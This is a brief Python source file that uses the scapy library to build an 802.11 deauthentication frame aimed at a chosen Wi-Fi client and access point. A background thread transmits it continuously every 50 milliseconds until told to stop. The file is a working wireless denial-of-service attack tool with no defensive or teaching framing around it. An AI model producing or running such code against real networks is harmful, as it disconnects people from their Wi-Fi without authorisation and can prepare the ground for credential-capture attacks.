import threading
import time

from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from scapy.sendrecv import sendp


class DeauthSender(threading.Thread):
    def __init__(self, iface, target_ap, target_client):
        super().__init__()
        self.iface = iface
        self.target_ap = target_ap
        self.target_client = target_client
        self.stop = False
        pass

    def run(self):
        deauth = RadioTap() / Dot11(
            type=0, subtype=12, addr1=self.target_client, addr2=self.target_ap, addr3=self.target_ap
        ) / Dot11Deauth(reason=4)
        while not self.stop:
            sendp(deauth, iface=self.iface, verbose=False)
            time.sleep(0.05)
